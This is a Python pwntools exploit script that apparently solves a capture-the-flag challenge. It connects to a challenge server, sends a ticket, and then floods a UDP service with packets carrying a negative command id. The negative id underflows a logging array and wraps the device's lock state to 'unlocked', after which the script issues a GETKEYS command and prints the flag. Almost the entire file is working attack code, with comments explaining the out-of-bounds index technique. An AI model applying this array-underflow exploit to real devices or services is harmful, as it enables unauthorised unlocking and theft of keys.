#!/bin/python3

import struct, socket, os, sys, time
from pwn import p32, p64, u32, u64, context, remote


'''typedef struct command_header{
	short version : 16;
	short type : 16;
	command_id_type id : 32;
} command_header;'''

'''void print_offsets(command_id_type id){
	fprintf(stderr, "\nAddress: %p\tOffset:%p\n", &(command_log[id]), (void*)((&(command_log[id]))-(command_log)));
}'''


print(f"Connecting to initial socket: %s" % os.getenv("CHAL_HOST", "127.0.0.1"))
ticket = os.getenv("TICKET")

p1 = remote(os.getenv("CHAL_HOST", "127.0.0.1"), os.getenv("CHAL_PORT", "19021"))


# pass ticket to ticket-taker
if ticket:
    prompt = p1.recv(128)  # "Ticket please:"
    p1.send((ticket + "\n").encode("utf-8"))
    print("Sent Ticket")

line = p1.readline()
#line = p1.readline()

service_host, service_port = line.rstrip().split(b':')[1:]

print("Connected, connecting to %s %s" % (service_host, service_port))
time.sleep(.5)

#service_host = '127.0.0.1'
#service_port = 3000

s = remote(service_host, service_port, typ='udp')

# Sends packets that unlock the device by underflowing the logging array, incrementing lower 2 bytes of the 
# unlocked state 254 times to trigger an overflow back around from 1->0, to get into UNLOCKED state

counter = 0
while True:
	s.send(struct.pack("<hhi", 0,0,-8))
	try:
		d = s.recv(1024) # recieve the response
	except socket.timeout:
		print("Socket not initialized yet, retrying...")
		time.sleep(.1)
		continue
	print(d)
	counter += 1
	if counter > 254:
		break

# Send a packet that calls the GETKEYS command, since we are now in the unlocked state
payload = b""
payload += struct.pack("<hhi", 0,0,9)
s.send(payload)

# Recieve the response
d = s.recv(1024)

# Parse the flag from the response
print("Flag:", d[d.find(b"flag"):])
